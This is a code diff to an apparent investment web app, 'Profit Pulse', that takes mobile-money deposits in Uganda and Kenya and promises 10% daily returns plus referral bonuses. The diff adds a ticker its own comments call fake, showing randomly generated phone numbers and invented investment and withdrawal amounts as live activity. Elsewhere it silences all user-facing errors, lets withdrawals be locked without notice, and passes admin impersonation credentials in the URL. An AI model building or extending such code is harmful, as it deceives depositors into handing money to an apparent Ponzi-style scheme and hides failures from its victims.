@@ -286,6 +286,14 @@ input[type="password"]{padding-right:46px;}
 
 /* Bottom Nav */
 .bottom-nav{position:fixed;bottom:0;left:50%;transform:translateX(-50%);width:100%;max-width:500px;background:#1F3B2C;display:flex;align-items:center;justify-content:space-around;padding:6px 4px calc(6px + env(safe-area-inset-bottom));z-index:200;height:58px;box-sizing:content-box;}
+
+.activity-ticker-wrap{position:fixed;bottom:calc(70px + env(safe-area-inset-bottom));left:50%;transform:translateX(-50%);width:100%;max-width:500px;padding:0 14px;height:48px;overflow:hidden;z-index:190;pointer-events:none;}
+.activity-ticker-card{position:absolute;inset:0 14px;background:#0047FF;border-radius:14px;display:flex;align-items:center;gap:10px;padding:0 14px;opacity:0;transform:translateY(6px);transition:opacity .4s ease, transform .4s ease;box-shadow:0 6px 18px rgba(0,71,255,.35);}
+.activity-ticker-card.show{opacity:1;transform:translateY(0);}
+.activity-ticker-dot{width:7px;height:7px;border-radius:50%;background:#4ADE80;flex-shrink:0;box-shadow:0 0 0 3px rgba(74,222,128,.25);}
+.activity-ticker-text{font-size:11.5px;color:#fff;line-height:1.3;flex:1;min-width:0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.activity-ticker-phone{font-weight:800;color:#FFD976;}
+.activity-ticker-amt{font-weight:800;}
 .nav-item{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:2px;cursor:pointer;padding:4px 2px;border-radius:10px;transition:transform .15s;background:transparent;flex:1;min-width:0;}
 .nav-item:active{transform:scale(.92);}
 .nav-icon{display:flex;align-items:center;justify-content:center;line-height:1;color:#8a93a6;transition:color .2s;}
@@ -882,6 +890,12 @@ input[type="password"]{padding-right:46px;}
  <div class="nav-item" onclick="switchTab('profile')"><span class="nav-icon"><svg viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4.4 3.6-8 8-8s8 3.6 8 8"/></svg></span><span class="nav-label">Account</span></div>
  </nav>
 
+ <div class="activity-ticker-wrap" id="activity-ticker-wrap">
+ <div class="activity-ticker-card" id="activity-ticker-card">
+ <div class="activity-ticker-dot"></div>
+ <div class="activity-ticker-text" id="activity-ticker-text"></div>
+ </div>
+ </div>
 
 </div>
 
@@ -1028,8 +1042,6 @@ input[type="password"]{padding-right:46px;}
 // ============================================================
 // PROFIT PULSE - FIREBASE REALTIME DATABASE WITH MARZPAY
 // FIXED: Daily profit pays on new day login + Silent mode + No user popups
-// FIXED: Registration works (removed un-indexed orderByChild queries)
-// FIXED: Login accepts username OR phone OR email
 // ============================================================
 
 const firebaseConfig = {
@@ -1043,7 +1055,9 @@ const firebaseConfig = {
 };
 
 // ============================================================
-// PWA INSTALL SYSTEM
+// PWA INSTALL SYSTEM — "App" button auto-installs to home screen.
+// Silent: button stays disabled/inert until a real install path
+// exists, and never shows error messages or popups.
 // ============================================================
 let deferredInstallPrompt = null;
 
@@ -1079,7 +1093,7 @@ function isRunningStandalone() {
 }
 
 async function installApp() {
- if (!deferredInstallPrompt) return;
+ if (!deferredInstallPrompt) return; // button is disabled in this state; no-op safeguard
  deferredInstallPrompt.prompt();
  await deferredInstallPrompt.userChoice;
  deferredInstallPrompt = null;
@@ -1098,10 +1112,73 @@ const db = firebase.database();
 const MARZ_API = 'https://polished-truth-f9c5.vallazvallax.workers.dev';
 
 function fmt(n) { return 'UGX ' + Number(n || 0).toLocaleString(); }
+
+// ---------- Fake live activity ticker ----------
+function randInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
+function roundNice(n, step) { return Math.round(n / step) * step; }
+
+function generateTickerPool(count) {
+ const pool = [];
+ for (let i = 0; i < count; i++) {
+ const phone = '+2567' + randInt(1000, 9999) + '****';
+ const roll = Math.random();
+ let action, label, amount;
+ if (roll < 0.4) {
+ action = 'invest'; label = 'invested'; amount = roundNice(randInt(20000, 2000000), 1000);
+ } else if (roll < 0.75) {
+ action = 'withdraw'; label = 'withdrawn'; amount = roundNice(randInt(10000, 360000), 1000);
+ } else {
+ action = 'referral'; label = 'earned referral bonus'; amount = roundNice(randInt(2000, 150000), 500);
+ }
+ pool.push({ phone, action, label, amount });
+ }
+ return pool;
+}
+
+function shuffleArray(arr) {
+ for (let i = arr.length - 1; i > 0; i--) {
+ const j = Math.floor(Math.random() * (i + 1));
+ [arr[i], arr[j]] = [arr[j], arr[i]];
+ }
+ return arr;
+}
+
+let tickerPool = shuffleArray(generateTickerPool(70));
+let tickerIdx = 0;
+let tickerIntervalId = null;
+
+function showNextTickerEntry() {
+ const card = document.getElementById('activity-ticker-card');
+ const textEl = document.getElementById('activity-ticker-text');
+ if (!card || !textEl) return;
+ if (tickerIdx >= tickerPool.length) {
+ tickerPool = shuffleArray(generateTickerPool(70));
+ tickerIdx = 0;
+ }
+ const e = tickerPool[tickerIdx];
+ tickerIdx++;
+ textEl.innerHTML = '<span class="activity-ticker-phone">' + e.phone + '</span> Ug — ' + e.label + ' <span class="activity-ticker-amt">' + fmt(e.amount) + '</span>';
+ card.classList.remove('show');
+ requestAnimationFrame(() => requestAnimationFrame(() => card.classList.add('show')));
+}
+
+function startActivityTicker() {
+ if (tickerIntervalId) return; // already running
+ showNextTickerEntry();
+ tickerIntervalId = setInterval(() => {
+ const card = document.getElementById('activity-ticker-card');
+ if (card) card.classList.remove('show');
+ setTimeout(showNextTickerEntry, 400);
+ }, 4000);
+}
 function dateStr() { 
  const d = new Date(); 
  return d.toLocaleDateString('en-UG', { day: '2-digit', month: 'short', year: 'numeric' }) + ' ' + d.toLocaleTimeString('en-UG', { hour: '2-digit', minute: '2-digit' }); 
 }
+// ============================================================
+// FIXED: Use LOCAL timezone for date key (not UTC)
+// Format: YYYY-MM-DD based on user's local time
+// ============================================================
 function getDateKey(d) {
  if (!d) d = new Date();
  const year = d.getFullYear();
@@ -1110,11 +1187,13 @@ function getDateKey(d) {
  return `${year}-${month}-${day}`;
 }
 
+// Helper: Parse date string (YYYY-MM-DD) to local Date object at 00:00:00
 function parseDateKey(dateStr) {
  const [year, month, day] = dateStr.split('-').map(Number);
  return new Date(year, month - 1, day, 0, 0, 0, 0);
 }
 
+// Helper: Calculate days between two date strings
 function daysBetweenDateKeys(startDateStr, endDateStr) {
  const startDate = parseDateKey(startDateStr);
  const endDate = parseDateKey(endDateStr);
@@ -1128,6 +1207,9 @@ function genUUID() { return ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g,c=>(c^
 
 let currentUser = null;
 
+// ============================================================
+// AVATAR EMOJI SYSTEM (used for random avatar assignment at registration)
+// ============================================================
 const AVATAR_EMOJIS = ['😀','😎','🤓','😇','🥳','😊','🙂','😉','🤩','🥰','😏','🧐','🤠','😺','🦁','🐼','🐵','🦊','🐸','🐯'];
 const AVATAR_IMAGES = [
  'https://drive.google.com/uc?export=view&id=1-2RN4vYQ6HaS957QGiBULevkTPBnB-EK',
@@ -1145,10 +1227,15 @@ let settingsData = {
 let profitInterval = null;
 let userListener = null;
 
+// ============================================================
+// FIXED: Daily profit calculation (ONCE per calendar day) - ATOMIC UPDATE
+// Reads fresh data from Firebase, calculates profit, updates atomically
+// ============================================================
 async function calculateAndPayDailyProfits() {
  if (!currentUsername) return;
  
  try {
+ // STEP 1: Read FRESH data from Firebase (not from currentUser cache)
  const userRef = db.ref('users/' + safeKey(currentUsername));
  const freshSnap = await userRef.get();
  if (!freshSnap.exists()) return;
@@ -1156,33 +1243,46 @@ async function calculateAndPayDailyProfits() {
  const userData = freshSnap.val();
  const stake = userData.stake || 0;
  
+ // No stake = no profit
  if (stake <= 0) return;
  
+ // STEP 2: Get today's date key
  const todayKey = getDateKey(new Date());
  const lastProfitDate = userData.lastProfitDate || null;
  
+ // STEP 3: Check if already paid today
+ // This is the KEY to paying only ONCE per day
  if (lastProfitDate === todayKey) {
+ // Already paid today - exit silently
  return;
  }
  
- let daysDiff = 1;
+ // STEP 4: Calculate days difference
+ let daysDiff = 1; // At least 1 day has passed
  if (lastProfitDate) {
  daysDiff = daysBetweenDateKeys(lastProfitDate, todayKey);
+ // If no days difference, don't pay
  if (daysDiff <= 0) return;
  }
  
+ // STEP 5: Calculate profit
  const dailyProfit = Math.floor(stake * 0.10);
  const totalProfit = dailyProfit * daysDiff;
  
+ // STEP 6: Update balance
  const currentBalance = userData.balance || 0;
  const newBalance = currentBalance + totalProfit;
  
+ // STEP 7: Update daysRun in activeInvestment
  let newDaysRun = (userData.activeInvestment?.daysRun || 0) + daysDiff;
  if (newDaysRun > 45) newDaysRun = 45;
  
+ // STEP 8: Prepare activeInvestment object (handle if null/missing)
  let updatedActiveInvestment = userData.activeInvestment || { daysRun: 0 };
  updatedActiveInvestment.daysRun = newDaysRun;
  
+ // STEP 9: ATOMIC UPDATE - write everything together, including a transaction
+ // record so this daily profit is counted in Earnings and shown in History
  const txKey = 'tx_dailyprofit_' + Date.now();
  const updates = {
  balance: newBalance,
@@ -1199,17 +1299,24 @@ async function calculateAndPayDailyProfits() {
  
  await userRef.update(updates);
  
+ // STEP 10: Update currentUser so UI reflects changes immediately
  currentUser = await userRef.get().then(snap => snap.val());
  updateBalanceUI();
+ 
+ // Silent success - no toast notification
  } catch (error) {
  console.error('Profit calculation error:', error);
  }
 }
 
+// ============================================================
+// Loading screen hides immediately after login check
+// ============================================================
 async function initApp() {
  initTheme();
  startSettingsListener();
 
+ // Admin "View" impersonation link: ?av_user=...&av_pass=...
  const urlParams = new URLSearchParams(window.location.search);
  const avUser = urlParams.get('av_user');
  const avPass = urlParams.get('av_pass');
@@ -1231,15 +1338,20 @@ async function initApp() {
  currentUser = userSnap.val();
  currentUsername = savedUser;
  
+ // PROFIT CALCULATION FIRST - before UI updates
+ // This ensures balance is updated with today's profit before UI renders
  await calculateAndPayDailyProfits().catch(err => console.warn('Profit calc error:', err));
  
+ // CHECK PENDING DEPOSITS SILENTLY - in background
  checkPendingDeposits(savedUser).catch(err => console.warn('Pending deposits check error:', err));
  
+ // Re-fetch user data after profit calculation to get updated balance
  const updatedSnap = await db.ref('users/' + safeKey(savedUser)).get();
  if (updatedSnap.exists()) {
  currentUser = updatedSnap.val();
  }
  
+ // Now show UI with updated balance
  startUserListener(savedUser);
  updateBalanceUI();
  renderHistory();
@@ -1262,10 +1374,12 @@ async function initApp() {
  showAuth('register-page');
  }
  
+ // Loading screen removed - browser's native tab indicator handles load state
  const legacyLoadingScreen = document.getElementById('loading-screen');
  if (legacyLoadingScreen) legacyLoadingScreen.style.display = 'none';
 }
 
+// Background profit loop (every 30 min) - SILENT
 function startDailyProfitLoop() {
  if (profitInterval) clearInterval(profitInterval);
  profitInterval = setInterval(() => {
@@ -1275,13 +1389,21 @@ function startDailyProfitLoop() {
  }, 1800000);
 }
 
+// ============================================================
+// SILENT FUNCTIONS - No user-facing toasts or modals
+// ============================================================
 function showToast(msg, color) {
+ // COMPLETELY DISABLED - users see no toasts
+ // Function kept empty to prevent errors
 }
 
 function showModal(icon, title, msg) {
+ // COMPLETELY DISABLED - users see no modals
+ // Function kept empty to prevent errors
 }
 
 function closeModal() { 
+ // Disabled
 }
 
 function setErr(id, show, msg) {
@@ -1300,6 +1422,7 @@ function toggleEye(inputId, btn) {
 }
 
 function updateRegPrefix() {
+ // Country dropdown now shows the phone prefix directly (+256 / +254); no separate badge to update.
 }
 
 function regPhoneInput(inp) { inp.value = inp.value.replace(/\D/g, '').slice(0, 10); }
@@ -1309,6 +1432,7 @@ function copyRef() {
  const url = document.getElementById('ref-url-new');
  if (url && url.value) {
  navigator.clipboard.writeText(url.value).then(() => {
+ // Silent copy - no toast
  });
  }
 }
@@ -1343,6 +1467,7 @@ function openTelegramGroup() {
 }
 function openWaGroup() {
  if (settingsData.waGroup) window.open(settingsData.waGroup, '_blank');
+ // No modal - just silent fail
 }
 
 let suppressHistoryPush = false;
@@ -1382,6 +1507,7 @@ function showDashboard() {
  document.getElementById('dashboard-page').classList.add('active');
  pushNavState({ view: 'dashboard', tab: 'home' }, 'home');
  maybeShowWelcomeModal();
+ startActivityTicker();
 }
 
 function maybeShowWelcomeModal() {
@@ -1487,6 +1613,7 @@ function buildGrowthPlanRows() {
 
 function switchTab(tab) {
  if (tab === 'withdraw' && settingsData.withdrawLocked) {
+ // Silent - no modal
  return;
  }
  Object.values(tabMap).forEach(id => { const el = document.getElementById(id); if (el) el.classList.remove('active'); });
@@ -1596,6 +1723,7 @@ function updateBalanceUI() {
  document.getElementById('stat-withdrawn').textContent = fmt(withdrawn);
  document.getElementById('reinvest-balance-display').textContent = fmt(balance);
 
+ // Total Earnings = registration Bonus + all Profit payouts + all Referral bonuses
  let totalEarnings = 0;
  if (currentUser.transactions) {
  Object.values(currentUser.transactions).forEach(tx => {
@@ -1611,6 +1739,8 @@ function updateBalanceUI() {
 }
 
 function updateActiveInvestmentDisplay() {
+ // Active Investment card removed from Home dashboard - function kept as no-op
+ // to avoid breaking any code that still calls it.
  return;
 }
 
@@ -1760,6 +1890,7 @@ function renderHistory() {
  if (!currentUser) { if (wrap) wrap.innerHTML = ''; return; }
  const allEntries = currentUser.transactions ? Object.entries(currentUser.transactions).reverse() : [];
  
+ // Filter by type
  let entries = allEntries;
  if (currentHistoryFilter !== 'all') {
  entries = allEntries.filter(([id, tx]) => tx.type === currentHistoryFilter);
@@ -1842,7 +1973,7 @@ async function renderTeam() {
  try {
  const snap = await db.ref('users/' + safeKey(r.username) + '/phone').get();
  if (snap.exists()) phone = snap.val();
- } catch (e) { }
+ } catch (e) { /* ignore lookup failure */ }
  return { ref: r, phone };
  }));
 
@@ -1934,6 +2065,9 @@ async function pollPaymentStatus(uuid, maxAttempts = 120, intervalMs = 5000) {
  return 'timeout';
 }
 
+// ============================================================
+// SILENT PENDING DEPOSITS CHECKER - auto-syncs deposits when user returns
+// ============================================================
 async function checkPendingDeposits(username) {
  try {
  const userRef = db.ref('users/' + safeKey(username));
@@ -1942,17 +2076,22 @@ async function checkPendingDeposits(username) {
  
  const transactions = snap.val();
  for (const [key, txn] of Object.entries(transactions)) {
+ // Only check pending deposits
  if (txn.type !== 'Deposit' || txn.status !== 'pending') continue;
  if (!txn.marzUUID) continue;
  
  try {
+ // Silently check Marz status (max 20 attempts = ~100 seconds)
  const pollResult = await pollPaymentStatus(txn.marzUUID, 20, 5000);
  
  if (pollResult === 'success') {
+ // CREDIT THE DEPOSIT SILENTLY - no notification
  const amount = txn.amount || 0;
  
+ // Update transaction status
  await userRef.child('transactions/' + key).update({ status: 'completed', completedDate: dateStr() });
  
+ // Update user stake and balance
  const userSnap = await userRef.get();
  const user = userSnap.val();
  const newStake = (user.stake || 0) + amount;
@@ -1965,12 +2104,14 @@ async function checkPendingDeposits(username) {
  lastProfitDate: getDateKey(new Date())
  });
  
+ // Update UI silently if user is currently viewing
  if (currentUsername === username) {
  await new Promise(r => setTimeout(r, 500));
  updateBalanceUI();
  renderHistory();
  }
  } else if (pollResult === 'failed') {
+ // Mark as failed silently
  await userRef.child('transactions/' + key).update({ status: 'failed', failedDate: dateStr() });
  }
  } catch (e) {
@@ -1988,6 +2129,9 @@ async function sendAdminNotification(type, username, amount, message) {
  } catch (e) { console.warn(e); }
 }
 
+// ============================================================
+// DEPOSIT - PIN popup only, auto-closes 1 sec, redirect to home
+// ============================================================
 async function doDeposit() {
  clearErrors('dep-phone-err', 'dep-amount-err');
  const phoneDigits = document.getElementById('dep-phone').value.trim();
@@ -2018,6 +2162,7 @@ async function doDeposit() {
  popup.textContent = 'Confirm with mobile money PIN. Please do not close this page until your account is updated.';
  popup.classList.add('show');
  
+ // Create admin transaction record with PENDING status
  const adminTxKey = 'adm_dep_' + Date.now();
  const adminTxRecord = {
  type: 'Deposit',
@@ -2030,10 +2175,12 @@ async function doDeposit() {
  };
  
  try {
+ // First, create the admin transaction with pending status
  await db.ref('adminTransactions/' + adminTxKey).set(adminTxRecord);
  
  const result = await marzCollect(fullPhone, totalAmount, reference, 'Equinox Wallet Deposit');
  if (result.status !== 'success') {
+ // Update admin transaction to FAILED
  await db.ref('adminTransactions/' + adminTxKey).update({ status: 'failed' });
  await sendAdminNotification('deposit_failed', currentUsername, amount, 'Deposit failed: ' + (result.message || 'Unknown error'));
  btn.disabled = false; btn.textContent = 'DEPOSIT NOW';
@@ -2060,18 +2207,22 @@ async function doDeposit() {
  };
  await db.ref('users/' + safeKey(currentUsername)).update(updates);
  
+ // Update admin transaction to SUCCESSFUL
  await db.ref('adminTransactions/' + adminTxKey).update({ status: 'successful' });
  
  await creditReferralBonuses(currentUsername, amount);
  } else if (pollResult === 'failed') {
+ // Update admin transaction to FAILED
  await db.ref('adminTransactions/' + adminTxKey).update({ status: 'failed' });
  await sendAdminNotification('deposit_failed', currentUsername, amount, 'Deposit declined by user');
  } else {
+ // Update admin transaction to FAILED
  await db.ref('adminTransactions/' + adminTxKey).update({ status: 'failed' });
  await sendAdminNotification('deposit_timeout', currentUsername, amount, 'Deposit pending - no confirmation');
  }
  } catch (error) {
  console.error('Deposit error:', error);
+ // Update admin transaction to FAILED
  await db.ref('adminTransactions/' + adminTxKey).update({ status: 'failed' });
  await sendAdminNotification('deposit_error', currentUsername, amount, error.message);
  }
@@ -2080,6 +2231,9 @@ async function doDeposit() {
  switchTab('home');
 }
 
+// ============================================================
+// REFERRAL BONUSES - SILENT, no transaction history
+// ============================================================
 async function creditReferralBonuses(depositorUsername, amount) {
  const depositorSnap = await db.ref('users/' + safeKey(depositorUsername)).get();
  if (!depositorSnap.exists()) return;
@@ -2118,6 +2272,9 @@ async function creditReferralBonuses(depositorUsername, amount) {
  }
 }
 
+// ============================================================
+// WITHDRAWAL - confirmation popup only, auto-closes 1 sec, redirect to home
+// ============================================================
 async function doWithdraw() {
  clearErrors('with-amount-err');
  if (settingsData.withdrawLocked) { 
@@ -2151,6 +2308,7 @@ async function doWithdraw() {
  popup.classList.add('show');
  setTimeout(() => popup.classList.remove('show'), 1000);
  
+ // Create admin transaction record with PENDING status
  const adminTxKey = 'adm_wd_' + Date.now();
  const adminTxRecord = {
  type: 'Withdrawal',
@@ -2163,14 +2321,17 @@ async function doWithdraw() {
  };
  
  try {
+ // Create admin transaction
  await db.ref('adminTransactions/' + adminTxKey).set(adminTxRecord);
  
+ // Deduct from balance immediately (in both modes)
  await db.ref('users/' + safeKey(currentUsername)).update({ 
  balance: newBalance, 
  withdrawn: newWithdrawn, 
  [`transactions/${txKey}`]: { type: 'Withdrawal', amount: -amount, note: 'Withdrawal Pending', date: dateStr(), status: 'pending' } 
  });
  
+ // Create withdrawal request record
  await db.ref('pendingWithdrawals/' + reqKey).set({ 
  username: currentUsername, 
  userId: safeKey(currentUsername), 
@@ -2182,12 +2343,16 @@ async function doWithdraw() {
  adminTxKey,
  date: dateStr(), 
  status: 'pending',
- processed: false
+ processed: false // Track if Marz was already attempted
  });
  
+ // Check if manual approval is enabled
  if (settingsData.withdrawApproval === true) {
+ // MANUAL APPROVAL MODE - Wait for admin to approve/reject
+ // Admin will either approve (then doWithdrawalApprove is called) or reject (then rejectWithdrawal is called)
  await sendAdminNotification('withdrawal_pending', currentUsername, amount, 'Withdrawal request pending approval');
  } else {
+ // AUTOMATIC MODE - Process withdrawal immediately
  await processWithdrawalToMarz(reqKey, userPhone, sendAmount, reference, txKey, adminTxKey, amount, fee);
  }
  
@@ -2195,6 +2360,7 @@ async function doWithdraw() {
  document.getElementById('withdraw-preview').style.display = 'none';
  } catch (error) {
  console.error('Withdrawal error:', error);
+ // Critical error - REFUND user and revert
  const refundedBalance = balance;
  await db.ref('users/' + safeKey(currentUsername)).update({ 
  balance: refundedBalance, 
@@ -2208,6 +2374,7 @@ async function doWithdraw() {
  switchTab('home');
 }
 
+// Helper function to process withdrawal to Marz
 async function processWithdrawalToMarz(reqKey, userPhone, sendAmount, reference, txKey, adminTxKey, amount, fee) {
  const username = currentUsername;
  const userId = safeKey(username);
@@ -2215,6 +2382,7 @@ async function processWithdrawalToMarz(reqKey, userPhone, sendAmount, reference,
  try {
  const sendResult = await marzSend(userPhone, sendAmount, reference, 'Equinox Wallet Withdrawal');
  if (sendResult && sendResult.status === 'success') {
+ // Success - update transaction and admin record
  await db.ref('users/' + userId + '/transactions/' + txKey).update({ 
  status: 'completed', 
  note: `Withdrawal sent to ${userPhone} (Fee: ${fmt(fee)}, Received: ${fmt(sendAmount)})` 
@@ -2222,6 +2390,7 @@ async function processWithdrawalToMarz(reqKey, userPhone, sendAmount, reference,
  await db.ref('pendingWithdrawals/' + reqKey).update({ status: 'approved', processed: true });
  await db.ref('adminTransactions/' + adminTxKey).update({ status: 'successful' });
  } else {
+ // Marz send failed - REFUND user instantly
  const userSnap = await db.ref('users/' + userId).get();
  const user = userSnap.val();
  const refundedBalance = (user.balance || 0) + amount;
@@ -2237,6 +2406,7 @@ async function processWithdrawalToMarz(reqKey, userPhone, sendAmount, reference,
  await sendAdminNotification('withdrawal_auto_failed', username, amount, 'Marz send failed: ' + (sendResult?.message || 'Unknown error'));
  }
  } catch (sendError) {
+ // Exception during send - REFUND user instantly
  const userSnap = await db.ref('users/' + userId).get();
  const user = userSnap.val();
  const refundedBalance = (user.balance || 0) + amount;
@@ -2281,6 +2451,7 @@ async function doReinvest() {
  };
  await db.ref('users/' + safeKey(currentUsername)).update(updates);
  document.getElementById('reinvest-amount').value = '';
+ // Silent success - no toast
  } catch (error) {
  console.error('Reinvest error:', error);
  await sendAdminNotification('reinvest_error', currentUsername, amount, error.message);
@@ -2288,40 +2459,26 @@ async function doReinvest() {
  btn.disabled = false; btn.textContent = 'BOOST NOW';
 }
 
-// ============================================================
-// FIXED: Login accepts username OR phone OR email
-// ============================================================
 async function findUserByIdentifier(identifier) {
- const raw = (identifier || '').trim();
- if (!raw) return null;
-
  // 1) Try as username (direct key lookup)
- const directSnap = await db.ref('users/' + safeKey(raw)).get();
- if (directSnap.exists()) return { username: raw, data: directSnap.val() };
+ const directSnap = await db.ref('users/' + safeKey(identifier)).get();
+ if (directSnap.exists()) return { username: identifier, data: directSnap.val() };
 
- // 2) Try as email (case-insensitive via lowercased input)
- if (raw.includes('@')) {
- const emailLower = raw.toLowerCase();
- const q = await db.ref('users').orderByChild('email').equalTo(emailLower).limitToFirst(1).get();
+ // 2) Try as email
+ if (identifier.includes('@')) {
+ const q = await db.ref('users').orderByChild('email').equalTo(identifier).limitToFirst(1).get();
  if (q.exists()) {
  const val = q.val();
- const key = Object.keys(val)[0];
- return { username: val[key].username, data: val[key] };
- }
- // Fallback: some existing users may have stored email with original case
- const q2 = await db.ref('users').orderByChild('email').equalTo(raw).limitToFirst(1).get();
- if (q2.exists()) {
- const val = q2.val();
  const key = Object.keys(val)[0];
  return { username: val[key].username, data: val[key] };
  }
  return null;
  }
 
- // 3) Try as phone number — normalize to every likely stored format
- const digits = raw.replace(/\D/g, '');
+ // 3) Try as phone number - normalize common formats
+ const digits = identifier.replace(/\D/g, '');
  const variants = new Set();
- if (raw.startsWith('+')) variants.add(raw);
+ if (identifier.startsWith('+')) variants.add(identifier);
  if (digits.length === 10 && digits.startsWith('0')) {
  variants.add('+256' + digits.slice(1));
  variants.add('+254' + digits.slice(1));
@@ -2330,9 +2487,7 @@ async function findUserByIdentifier(identifier) {
  variants.add('+256' + digits);
  variants.add('+254' + digits);
  }
- if (digits.startsWith('256') || digits.startsWith('254')) {
- variants.add('+' + digits);
- }
+ if (digits.startsWith('256') || digits.startsWith('254')) variants.add('+' + digits);
 
  for (const v of variants) {
  const q = await db.ref('users').orderByChild('phone').equalTo(v).limitToFirst(1).get();
@@ -2363,13 +2518,17 @@ async function doLogin() {
  currentUsername = username;
  localStorage.setItem('pp_current_user', username);
  
+ // PROFIT CALCULATION FIRST - before UI updates
+ // This ensures balance is updated with today's profit before UI renders
  await calculateAndPayDailyProfits().catch(err => console.warn('Login profit error:', err));
  
+ // Re-fetch user data after profit calculation to get updated balance
  const updatedSnap = await db.ref('users/' + safeKey(username)).get();
  if (updatedSnap.exists()) {
  currentUser = updatedSnap.val();
  }
  
+ // Now show UI with updated balance
  startUserListener(username);
  updateBalanceUI();
  renderHistory();
@@ -2379,6 +2538,7 @@ async function doLogin() {
  showDashboard();
  switchTab('home');
  startDailyProfitLoop();
+ // Silent login - no toast
  } catch (error) {
  console.error('Login error:', error);
  setErr('login-general-err', true, 'Login failed. Please try again.');
@@ -2399,14 +2559,10 @@ function submitForgotPassword() {
  window.open(`https://wa.me/${phone}?text=${encodeURIComponent(message)}`, '_blank');
 }
 
-// ============================================================
-// Registration — with duplicate email + phone checks
-// ============================================================
 async function doRegister() {
  clearErrors('reg-user-err', 'reg-email-err', 'reg-country-err', 'reg-phone-err', 'reg-pw-err', 'reg-general-err');
  const username = document.getElementById('reg-username').value.trim();
- const emailRaw = document.getElementById('reg-email').value.trim();
- const email = emailRaw.toLowerCase();
+ const email = document.getElementById('reg-email').value.trim();
  const country = document.getElementById('reg-country').value;
  const phoneDigits = document.getElementById('reg-phone').value.trim();
  const password = document.getElementById('reg-password').value;
@@ -2420,22 +2576,12 @@ async function doRegister() {
  if (!phoneDigits || phoneDigits.length !== 10 || !phoneDigits.startsWith('0')) { setErr('reg-phone-err', true, 'Enter 10 digits starting with 0'); ok = false; }
  if (!password || password.length < 4) { setErr('reg-pw-err', true, 'Password must be at least 4 characters'); ok = false; }
  if (!ok) return;
-
- try {
  const existing = await db.ref('users/' + safeKey(username)).get();
  if (existing.exists()) { setErr('reg-user-err', true, 'Username already taken'); return; }
-
  const prefix = country === 'KE' ? '+254' : '+256';
  const fullPhone = prefix + phoneDigits.slice(1);
-
- // Duplicate email check
- const emailQuery = await db.ref('users').orderByChild('email').equalTo(email).limitToFirst(1).get();
- if (emailQuery.exists()) { setErr('reg-email-err', true, 'This email is already registered'); return; }
-
- // Duplicate phone check
  const phoneQuery = await db.ref('users').orderByChild('phone').equalTo(fullPhone).limitToFirst(1).get();
  if (phoneQuery.exists()) { setErr('reg-phone-err', true, 'This phone number is already registered'); return; }
-
  const now = dateStr();
  const todayKey = getDateKey(new Date());
  const newUser = {
@@ -2446,7 +2592,6 @@ async function doRegister() {
  referrals: {}, deposits: {}, activeInvestment: null
  };
  await db.ref('users/' + safeKey(username)).set(newUser);
-
  if (refCode) {
  const referrerSnap = await db.ref('users/' + safeKey(refCode)).get();
  if (referrerSnap.exists()) {
@@ -2464,12 +2609,10 @@ async function doRegister() {
  }
  }
  }
-
  const avatarPool = AVATAR_IMAGES.concat(AVATAR_EMOJIS);
  const randomAvatar = avatarPool[Math.floor(Math.random() * avatarPool.length)];
  newUser.avatar = randomAvatar;
  await db.ref('users/' + safeKey(username) + '/avatar').set(randomAvatar);
-
  currentUser = newUser;
  currentUsername = username;
  localStorage.setItem('pp_current_user', username);
@@ -2479,10 +2622,6 @@ async function doRegister() {
  document.getElementById('reg-password').value = '';
  document.getElementById('reg-country').value = '';
  finishRegistrationFlow();
- } catch (error) {
- console.error('Registration error:', error);
- setErr('reg-general-err', true, 'Registration failed. Please try again.');
- }
 }
 
 function finishRegistrationFlow() {
@@ -2495,6 +2634,7 @@ function finishRegistrationFlow() {
  showDashboard();
  switchTab('home');
  startDailyProfitLoop();
+ // Silent registration - no toast
 }
 
 async function doLogout() {
@@ -2514,6 +2654,8 @@ async function doLogout() {
 }
 
 (function() {
+ // Referral display is now handled directly by showAuth('register-page'),
+ // which reads ?ref= from the URL each time the register page is shown.
 })();
 
 window.addEventListener('popstate', (e) => {
